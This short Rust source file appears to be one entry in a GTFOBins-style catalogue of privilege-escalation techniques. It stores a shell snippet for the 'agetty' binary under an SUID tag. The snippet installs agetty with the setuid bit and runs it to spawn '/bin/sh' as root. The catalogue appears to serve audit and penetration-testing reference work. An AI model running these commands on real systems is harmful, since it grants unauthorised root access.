pub static BIN_NAME: &'static str = "agetty";
static SUID_CODE: &'static str = r#"
        
    sudo install -m =xs $(which agetty) .

    ./agetty -o -p -l /bin/sh -a root tty
"#;

use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
